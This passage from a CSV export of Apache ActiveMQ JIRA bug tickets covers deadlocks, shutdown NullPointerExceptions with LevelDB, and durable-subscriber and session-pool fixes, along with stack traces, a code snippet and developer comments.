Just ran it fine locally.;;;","07/Mar/13 17:00;kearls;Sorry, forgot to put that it was on trunk.  I checked out a clean copy to verify.  It also failed on the last Jenkins build.

;;;","07/Mar/13 17:13;tabish;Fixed, its parent class was changed to not use a fixed port for the Broker and it wasn't updated to take that into account.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock during close while publishing to flow-controlled queue,AMQ-4361,12635662,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,shendley,shendley,06/Mar/13 21:02,22/Oct/15 14:51,14/Jul/23 05:43,03/Apr/13 19:23,5.6.0,5.8.0,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,"TestCase on github: 

https://github.com/samhendley/activemq-close-deadlock-bug

The deadlock occurs when we are using TcpTransport to a flow-controlled queue and we then try to gracefully shutdown the application. The close operation hangs forever because it is trying to send a ""close packet"" to the server. It never gets the chance to send that request because the socket is blocked by the publishing thread. This stops my publisher from shutting down and causes us to orphan threads during shutdown.

I have verified this bug occurs on atleast activemq 5.6.0 and 5.8.0 and on linux and windows using JDK 1.6.

I don't need a fix for the bug necessarily, just a way to gracefully shutdown my publisher if I get into this state.

Partial Stack Trace During failure
""ClosingThread"" prio=6 tid=0x045ce000 nid=0xa84 waiting on condition [0x04ddf000]
   java.lang.Thread.State: WAITING (parking)
    at sun.misc.Unsafe.park(Native Method)
    - parking to wait for  <0x23fc52d8> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:156)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:811)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:842)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1178)
    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:186)
    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:262)
    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)
    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
    at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1304)
    at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1298)
    at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:1901)
    at org.apache.activemq.ActiveMQMessageProducer.close(ActiveMQMessageProducer.java:173)
    at org.activemq.bug.DeadlockDuringCloseTest$2.run(DeadlockDuringCloseTest.java:83)
    at java.lang.Thread.run(Thread.java:662)

""PublishingThread"" prio=6 tid=0x045cd800 nid=0xb84 runnable [0x04d8f000]
   java.lang.Thread.State: RUNNABLE
    at java.net.SocketOutputStream.socketWrite0(Native Method)
    at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:92)
    at java.net.SocketOutputStream.write(SocketOutputStream.java:136)
    at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)
    at java.io.DataOutputStream.flush(DataOutputStream.java:106)
    at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)
    at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:322)
    at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:304)
    at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)
    at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:104)
    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)
    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
    at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1304)
    at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1298)
    at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1782)
    - locked <0x23faa7d8> (a java.lang.Object)
    at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:289)
    at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:224)
    at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:300)
    at org.activemq.bug.DeadlockDuringCloseTest$1.run(DeadlockDuringCloseTest.java:63)
    at java.lang.Thread.run(Thread.java:662)
","Windows, Linux, JDK 1.6",ceposta,gtully,jira-bot,mut,shendley,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,316155,,,Thu Oct 22 14:51:16 UTC 2015,,,,,,,,,,,"0|i1ijzj:",316498,,,,,,,,,,,,,,,,,,,,,"06/Mar/13 22:43;ceposta;We can definitely check into this bug, but when sending async (or non-persistent) like you are, you may wish to consider using producer windows so you don't run into this type of producer flow control which blocks the entire connection.

See here:

http://activemq.apache.org/producer-flow-control.html;;;","06/Mar/13 22:53;tabish;You should be able to interrupt the Thread that's blocked in the sync send call so that the application can shutdown normally.;;;","06/Mar/13 23:01;shendley;I had tried both of those tricks before without fixing the issue. The key was to do both at the same time. By turning on producer windowing I am not blocking on a socket write which means the Thread.interrupt will work because we blocking on a regular lock. I'll update the example project showing the workaround. That solves my immediate issue, is this otherwise considered a ""wont fix""?;;;","06/Mar/13 23:03;shendley;To be clear: Thread.interrupt() while in SocketOutputStream.socketWrite doesn't work. I needed to be in the ""window blocking"" for thread.interrupt to work.;;;","06/Mar/13 23:09;tabish;You're welcome to figure out a clever fix and submit a patch, not sure there's a whole lot that can be done in this case. ;;;","07/Mar/13 15:11;shendley;So it makes sense to me why the non-producer window version blocks; native socket writes don't react to thread.interrupt(). I can't think of a way around that problem. The only thing I would imagine helping is to default to the other strategy and then require people to opt-in to this more dangerous (and less performant?) mode.

However I was annoyed by the fact I need a Thread.interrupt even with the other version. This means I need to add an extra level of synchronized bookkeeping to perform a clean shutdown. I dug into the source code of activemq and the issue is there is a tight wait loop in org.apache.activemq.usage.MemoryUsage where it only checks the ""percentUsed"" field. I believe it should also look at the ""started"" field and bail if the usage counter has been stopped. I have to imagine that was what the developers of that class were planning, on the stop method they notify on the same mutex to wake up all the listeners (presumably so they can bail quickly). I looked at all of the implementations of Usage and they all seem to have the same issue. Shouldn't they all check ""started"" and bail if the condition they are trying to reach can never be reached?;;;","07/Mar/13 15:17;tabish;Create a test case and propose a patch to the issue, we can review it and see if it makes sense / doesn't break anything.  Sounds like something that would be a benefit.  ;;;","03/Apr/13 19:23;tabish;Fixed the MemoryUsage waitForSpace code throws an InterruptedException so that the windowed producer send will throw an JMSException when the Producer is closed.  ;;;","22/Oct/15 13:53;shendley;We recently updated to 5.12.0 and a test I had put in place to track the ""higher level"" shutdown started failing occasionally. I still haven't worked out the cause of that but I did try enabling ProducerWindowSize to verify the fix to this bug. So technically it closes quickly but it is throwing an IllegalMonitorStateException. There is a bug in the waitForSpace method where we don't relock the readLock if the waitForSpaceCondition throws.

{code}
java.lang.IllegalMonitorStateException: attempt to unlock read lock, not locked by current thread
	at java.util.concurrent.locks.ReentrantReadWriteLock$Sync.unmatchedUnlockException(ReentrantReadWriteLock.java:447)
	at java.util.concurrent.locks.ReentrantReadWriteLock$Sync.tryReleaseShared(ReentrantReadWriteLock.java:431)
	at java.util.concurrent.locks.AbstractQueuedSynchronizer.releaseShared(AbstractQueuedSynchronizer.java:1340)
	at java.util.concurrent.locks.ReentrantReadWriteLock$ReadLock.unlock(ReentrantReadWriteLock.java:883)
	at org.apache.activemq.usage.MemoryUsage.waitForSpace(MemoryUsage.java:87)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:282)
	at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:223)
	at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:269)
	at org.springframework.jms.connection.CachedMessageProducer.send(CachedMessageProducer.java:181)
	at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:636)
	at org.springframework.jms.core.JmsTemplate.doSend(JmsTemplate.java:607)
	at org.springframework.jms.core.JmsTemplate$3.doInJms(JmsTemplate.java:572)
	at org.springframework.jms.core.JmsTemplate.execute(JmsTemplate.java:494)
	at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:569)
	at org.springframework.jms.core.JmsTemplate.send(JmsTemplate.java:560)
	at com.sms.jms.FastInterruptibleSingleDestinationJmsOutClient.send(FastInterruptibleSingleDestinationJmsOutClient.java:77)
	at com.sms.jms.FastInterruptibleSingleDestinationJmsOutClient.publishAsBytesMessage(FastInterruptibleSingleDestinationJmsOutClient.java:68)
	at com.sms.jms.FastInterruptibleSingleDestinationJmsOutClientTest$2.run(FastInterruptibleSingleDestinationJmsOutClientTest.java:83)
	at java.lang.Thread.run(Thread.java:744)}}
{code}

{code}
public boolean waitForSpace(long timeout) throws InterruptedException {
        if (parent != null) {
            if (!parent.waitForSpace(timeout)) {
                return false;
            }
        }
        usageLock.readLock().lock();
        try {
            if (percentUsage >= 100) {
                usageLock.readLock().unlock();
                usageLock.writeLock().lock();
                try {
                    while (percentUsage >= 100 ) {
                        waitForSpaceCondition.await(timeout, TimeUnit.MILLISECONDS);
                    }
                    // I believe this relocking needs to be in the finally block.
                    usageLock.readLock().lock();
                } finally {
                    usageLock.writeLock().unlock();
                }
            }

            return percentUsage < 100;
        } finally {
            usageLock.readLock().unlock();
        }
    }
{code};;;","22/Oct/15 14:50;jira-bot;Commit 9ddd162d2584f39c8e3b303db91dc43143381ecc in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=9ddd162 ]

https://issues.apache.org/jira/browse/AMQ-4361 - implement suggestion from Sam hendley with thanks, avoid the IllegalMonitorStateException
;;;","22/Oct/15 14:51;gtully;[~shendley] thanks, sorted that IllegalMonitorStateException;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-web simple session pool needs more error handling,AMQ-4359,12634852,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,01/Mar/13 16:56,01/Mar/13 16:58,14/Jul/23 05:43,01/Mar/13 16:58,5.6.0,5.7.0,5.8.0,,,5.9.0,,,Broker,,,,0,,,,,,,,,The simple session pool in the activemq-web doesn't cleanup in its getConnection method leading to it using and returning an invalid connection object. ,,tabish,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,315345,,,Fri Mar 01 16:58:06 UTC 2013,,,,,,,,,,,"0|i1iezz:",315689,,,,,,,,,,,,,,,,,,,,,"01/Mar/13 16:58;tabish;Updated code to check for and properly handle connection exceptions.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
unsubcribes DurableSuscriber does not work  well with Virtual Topics ,AMQ-4356,12634821,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,fedew,fedew,01/Mar/13 14:49,05/Jun/13 12:03,14/Jul/23 05:43,04/Apr/13 20:30,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"We have a Virtual Topic with 2 consumers
then we use a DurableSubscriber to the topic (to use it as a normal topic)
when we call session.unsubscribe the methods ends ok and the DurableSubscribers disappears(from the webConsole) but the storePercentUsage does't decrements  and when we restart the broker durableSuscribers are there again. ",With kahaDb store,fbalicchia,fedew,tabish,tmielke,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,315314,,,Wed Jun 05 12:03:33 UTC 2013,,,,,,,,,,,"0|i1iet3:",315658,,,,,,,,,,,,,,,,,,,,,"01/Mar/13 14:58;tabish;Would be helpful if you could create a JUnit test case that demonstrates the issue.;;;","01/Mar/13 17:23;fedew;Ok , i have a test but is not complete because the broker is remote and i need restart the broker manually let me see if i can imbibe and restart the broker inside the test.
;;;","01/Mar/13 17:44;tabish;Have a look at the unit tests for AMQ, a grep for BrokerService will show you lots of examples of creating an embedded broker.  AMQ3445Test.java has some decent broker restart examples, and there already a virtual destination test case for durables you could add to VirtualTopicsAndDurableSubsTest.java;;;","04/Apr/13 19:34;tabish;I have a test case that can reproduce this now. ;;;","04/Apr/13 20:30;tabish;Fix and test added on trunk, should appear in the next nightly 5.9;;;","05/Jun/13 12:03;tmielke;This fix is superseded by AMQ-4571.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock when unsubscribing durable subscriber,AMQ-4351,12634386,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tlammens,tlammens,27/Feb/13 10:07,26/Apr/13 22:52,14/Jul/23 05:43,26/Apr/13 22:52,5.7.0,5.8.0,,,,5.9.0,,,Broker,,,,0,patch,,,,,,,,"We started using durable subscribers a week ago, and after the 4th durable subscriber unsubscribed (due to 1 hour inactivity), the system deadlocked. If the ""Durable Subscriber Cleanup Timer"" goes of at the wrong time, your entire server locks up. 

Setup: 
Active MQ 5.7.0 with master/slave using JDBC store 
Approx 3 - 5 concurrent durable subscribers 
Approx 5 messages / sec 

Active MQ checks every 1 minute for subscribers which have been offline for 1 hour. 

Locked threads: 
""ActiveMQ Transport: tcp:///79.125.71.104:48082@8090"": 
        at org.apache.activemq.broker.region.Topic.doMessageSend(Topic.java:446) 
        - waiting to lock <0x00000000c6228480> (a org.apache.activemq.broker.region.Topic) 
        at org.apache.activemq.broker.region.Topic.send(Topic.java:427) 
        at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407) 
        at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503) 


""ActiveMQ Transport: tcp:///79.125.71.104:47590@8090"": 
        at org.apache.activemq.broker.region.PrefetchSubscription.add(PrefetchSubscription.java:142) 
        - waiting to lock <0x00000000c66ba050> (a java.lang.Object) 
        at org.apache.activemq.broker.region.DurableTopicSubscription.add(DurableTopicSubscription.java:243) 
        at org.apache.activemq.broker.region.policy.StrictOrderDispatchPolicy.dispatch(StrictOrderDispatchPolicy.java:58) 


""ActiveMQ Durable Subscriber Cleanup Timer"": 
        at org.apache.activemq.broker.region.Topic.deactivate(Topic.java:288) 
        - waiting to lock <0x00000000c6250670> (a java.util.concurrent.CopyOnWriteArrayList) 
        at org.apache.activemq.broker.region.DurableTopicSubscription.deactivate(DurableTopicSubscription.java:184) 
        - locked <0x00000000c66ba060> (a java.lang.Object) 
        - locked <0x00000000c66ba050> (a java.lang.Object) 
        at org.apache.activemq.broker.region.Topic.deleteSubscription(Topic.java:195) 
        at org.apache.activemq.broker.region.TopicRegion.removeSubscription(TopicRegion.java:199) 
        at org.apache.activemq.broker.region.TopicRegion.doCleanup(TopicRegion.java:99) 


I have attached a patch which fixes the problem.
Since there is only one dispatch policy per Topic, synchronisation can happen on the DispatchPolicy instead of on the consumers object which causes the deadlock.","Setup: 
Active MQ 5.7.0 with master/slave using JDBC store 
Approx 3 - 5 concurrent durable subscribers 
Approx 5 messages / sec ",ceposta,frederikcolardyn,gtully,tabish,tlammens,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Feb/13 14:13;frederikcolardyn;ActiveMQUnsubscribeTest.java;https://issues.apache.org/jira/secure/attachment/12571413/ActiveMQUnsubscribeTest.java","27/Feb/13 10:08;tlammens;dispatcher.patch;https://issues.apache.org/jira/secure/attachment/12571177/dispatcher.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314879,,,Fri Apr 26 22:52:15 UTC 2013,,,,,,,Patch Available,,,,"0|i1ic4f:",315223,,,,,,,,,,,,,,,,,,,,,"28/Feb/13 13:37;gtully;@Tim, thanks for the report and patch. Is there any chance you could provide a unit test that can demonstrate so that we can protect the change?

My suspicion is that the cleanup safety should not come down to sync on the consumers list, but should be handled at a higher level.;;;","28/Feb/13 14:13;frederikcolardyn;Hi Gary,

It's easy to reproduce, and we've got a unit test for it (see attach), but it's not very well suited to include in an automated build system as it produces high load over ± 4 minutes in order to trigger the deadlock. It's reliable though, always deadlocking without the patch.

Scenario:
1. 100 durable consumers, of which 97 go inactive after receiving the first message
2. producer sends messages as fast as possible
3. after 3 minutes, broker tries to clean up the 97 inactive producers => always deadlocks. No more messages are being sent to the active produces. kill -3 of the jms broker always shows the same deadlock.

We took 100 durable consumers in our test in order to provoke the deadlock quickly, but in our production system it occurred with only 4 consumers (of which 1 was cleaned up after 1 hour inactivity).;;;","01/Mar/13 03:53;wangyin;I'm interesting in the issue.It seems the thread stack does not reveal the deadlock threads and the test is not an unit test as there are many special objects rather than pure AMQ objects.
;;;","12/Mar/13 04:11;ceposta;Looks like Hiram fixed this one w/ r1455290. Can you verify the fix in the next nightly build?;;;","12/Mar/13 13:30;chirino;I've fixed the dead lock and included a leaner vesion of the test case at: [commit|https://github.com/apache/activemq/commit/846cf7df3fdea5c27030ed77473aba3b5a4699aa];;;","26/Apr/13 17:15;tabish;Changes for this issue have affected the destination stats for Topics depending on whether keep durable subs active is true or not. ;;;","26/Apr/13 22:52;tabish;Fixed the stats issue on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ 5.8.0 thows nullpointer exception while shutting down (NIO + LevelDB + pending Non Peristent Messages),AMQ-4349,12634182,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,rgooduru,rgooduru,26/Feb/13 15:54,08/Oct/15 22:08,14/Jul/23 05:43,18/Jul/14 13:15,,,,,,5.11.0,,,,,,,0,,,,,,,,,"I am not sure whether I have to post this in the mailling list first or open a ticket. 

We updated our activemq broker to version 5.8.0 and replaced the persistent store from kahadb to leveldb. The persistent write performance increased by 10 times but at the same time the non persistent message write and read performance is decreased. Especially the read performance is decreased a lot.

When there are not persistent messages on the broker and if we do graceful shutdown, the broker throws a null pointer exception. This is happening only if we use leveldb. Here is the stack trace.

2013-02-26 06:06:58,956 | INFO  | Stopped LevelDB[/opt/activemq/data/leveldb] | org.apache.activemq.leveldb.LevelDBStore | Thread-16
2013-02-26 06:06:58,957 | ERROR | Could not stop service: QueueRegion: destinations=1, subscriptions=0, memory=0%. Reason: java.lang.NullPointerException | org.apache.activemq.broker.jmx.Ma
nagedQueueRegion | Thread-16
java.lang.NullPointerException
        at org.fusesource.hawtdispatch.package$RichExecutor.execute(hawtdispatch.scala:171)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.apply(hawtdispatch.scala:68)
        at org.fusesource.hawtdispatch.package$RichExecutor.apply(hawtdispatch.scala:169)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.future(hawtdispatch.scala:116)
        at org.fusesource.hawtdispatch.package$RichExecutor.future(hawtdispatch.scala:169)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.sync(hawtdispatch.scala:107)
        at org.fusesource.hawtdispatch.package$RichExecutor.sync(hawtdispatch.scala:169)
        at org.apache.activemq.leveldb.DBManager.destroyPList(DBManager.scala:773)
        at org.apache.activemq.leveldb.LevelDBStore.removePList(LevelDBStore.scala:454)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroyDiskList(FilePendingMessageCursor.java:168)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroy(FilePendingMessageCursor.java:163)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:82)
        at org.apache.activemq.broker.region.Queue.stop(Queue.java:910)
        at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:117)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:574)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:126)
        at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:194)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:204)
        at org.apache.activemq.broker.BrokerService$5.stop(BrokerService.java:2070)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:715)
        at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:96)
        at org.apache.activemq.console.command.StartCommand$1.run(StartCommand.java:148)
",,dejanb,rgooduru,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4346,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314675,,,Fri Jul 18 13:15:11 UTC 2014,,,,,,,,,,,"0|i1iav3:",315019,,,,,,,,,,,,,,,,,,,,,"10/May/13 22:52;tabish;No test case for reproducing this.;;;","18/Jul/14 13:15;dejanb;This is now fixed on the trunk. The root of the problem was that LevelDBStore was also a TransactionStore. So, when broker was stopping the TransactionBroker was stopping the whole store earlier than it should, leading to this error later in the process.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Activemq-5.8.0 Shutdown failing when using NIO + LevelDB,AMQ-4346,12633995,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,rgooduru,rgooduru,25/Feb/13 21:25,08/Oct/15 22:08,14/Jul/23 05:43,26/Feb/13 15:57,,,,,,,,,,,,,0,,,,,,,,,"I configured activemq 5.8.0 with nio connector and leveldb. When ./activemq stop is issued shutdown process is throwing an exception. Its a standalone installation.

Here is the exception.

2013-02-25 12:15:07,431 | INFO  | Connector amqp Stopped | org.apache.activemq.broker.TransportConnector | ActiveMQ ShutdownHook
2013-02-25 12:15:07,549 | INFO  | Stopped LevelDB[/opt/activemq/data/leveldb] | org.apache.activemq.leveldb.LevelDBStore | ActiveMQ Sh
utdownHook
2013-02-25 12:15:07,550 | ERROR | Could not stop service: QueueRegion: destinations=1, subscriptions=0, memory=0%. Reason: java.lang.N
ullPointerException | org.apache.activemq.broker.jmx.ManagedQueueRegion | ActiveMQ ShutdownHook
java.lang.NullPointerException
        at org.fusesource.hawtdispatch.package$RichExecutor.execute(hawtdispatch.scala:171)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.apply(hawtdispatch.scala:68)
        at org.fusesource.hawtdispatch.package$RichExecutor.apply(hawtdispatch.scala:169)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.future(hawtdispatch.scala:116)
        at org.fusesource.hawtdispatch.package$RichExecutor.future(hawtdispatch.scala:169)
        at org.fusesource.hawtdispatch.package$RichExecutorTrait$class.sync(hawtdispatch.scala:107)
        at org.fusesource.hawtdispatch.package$RichExecutor.sync(hawtdispatch.scala:169)
        at org.apache.activemq.leveldb.DBManager.destroyPList(DBManager.scala:773)
        at org.apache.activemq.leveldb.LevelDBStore.removePList(LevelDBStore.scala:454)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroyDiskList(FilePendingMessageCursor.java:168)
        at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.destroy(FilePendingMessageCursor.java:163)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.stop(StoreQueueCursor.java:82)
        at org.apache.activemq.broker.region.Queue.stop(Queue.java:910)
        at org.apache.activemq.broker.region.AbstractRegion.stop(AbstractRegion.java:117)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.region.RegionBroker.doStop(RegionBroker.java:574)
        at org.apache.activemq.broker.jmx.ManagedRegionBroker.doStop(ManagedRegionBroker.java:126)
        at org.apache.activemq.broker.region.RegionBroker.stop(RegionBroker.java:194)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.BrokerFilter.stop(BrokerFilter.java:161)
        at org.apache.activemq.broker.TransactionBroker.stop(TransactionBroker.java:204)
        at org.apache.activemq.broker.BrokerService$5.stop(BrokerService.java:2070)
        at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41)
        at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:715)
        at org.apache.activemq.xbean.XBeanBrokerService.stop(XBeanBrokerService.java:96)
        at org.apache.activemq.broker.BrokerService.containerShutdown(BrokerService.java:2282)
        at org.apache.activemq.broker.BrokerService$6.run(BrokerService.java:2249)
",,rgooduru,volkerk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4349,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,314489,,,Thu Oct 08 21:53:33 UTC 2015,,,,,,,,,,,"0|i1i9pr:",314833,,,,,,,,,,,,,,,,,,,,,"26/Feb/13 15:57;rgooduru;Duplicate ;;;","08/Oct/15 21:49;volkerk;of what?;;;","08/Oct/15 21:53;volkerk;found it - dupe of AMQ-4349

point I was trying to make is that it's *not* a dupe unless there's a valid reference to the issue it duplicates;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NIOSSLConcurrencyTest.testLoad fails on slow boxes,AMQ-4345,12633992,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,kearls,kearls,25/Feb/13 21:01,25/Feb/13 21:18,14/Jul/23 05:43,25/Feb/13 21:18,,,,,,5.8.0,,,Test Cases,,,,0,,,,,,,,,"I'll attach a patch which bumps up the timeout.
